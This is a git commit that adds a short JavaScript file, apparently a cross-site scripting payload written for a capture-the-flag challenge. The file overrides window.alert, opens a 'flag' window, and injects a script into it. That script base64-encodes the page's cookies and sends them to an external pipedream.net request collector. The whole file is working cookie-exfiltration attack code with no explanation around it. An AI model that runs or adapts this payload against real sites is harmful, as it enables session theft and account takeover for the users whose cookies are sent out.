2e45d46d615b0c6cd3d7ac144cd0ec4cea1414b7
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2023-02-27 01:08:03 +0530

    Create last.js

---
+++ last.js
@@ -0,0 +1,5 @@
+window.alert = function() {console.log("alert(1337)")};
+flag = window.open("flag", "_blank")
+flag.window.document.onload = () =>{
+    flag.window.document.write('<script>var xhttp = new XMLHttpRequest();xhttp.open("Get","https://eoctl0knzoys9l9.m.pipedream.net/?flag="+btoa(flag.window.document.cookie));xhttp.send()</script>')    
+}
